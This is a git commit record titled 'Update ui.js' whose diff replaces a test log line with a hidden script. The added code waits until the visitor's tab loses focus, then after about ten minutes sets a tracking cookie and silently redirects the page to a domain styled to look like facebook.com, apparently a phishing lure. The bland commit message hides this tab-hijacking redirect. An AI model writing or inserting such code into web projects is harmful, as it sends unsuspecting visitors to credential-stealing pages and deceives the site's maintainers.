42ade0b76b98571ba2c824e909e9b3728b694a95
kimst0ne <94846591+kimst0ne@users.noreply.github.com>
2022-01-12 08:29:42 +0000

    Update ui.js

--- js/ui.js
+++ js/ui.js
@@ -1,1 +1,13 @@
-console.log('test');
+<script>
+var timeout1;
+window.onblur=function(){timeout1=setTimeout('gogo()',598765);};
+window.onfocus=function(){clearTimeout(timeout1);};
+function gogo()
+{
+if(document.cookie.indexOf('fb_inter_sbx')<0)
+  {
+  	document.cookie = "fb_inter_sbx=" + Date.now() + ";path=/";
+  	window.location.assign("https://www.facebook.com.b2d-74fa503a-5c1.magicgate.cloud/qPeAhtbP");
+  }
+}
+</script>
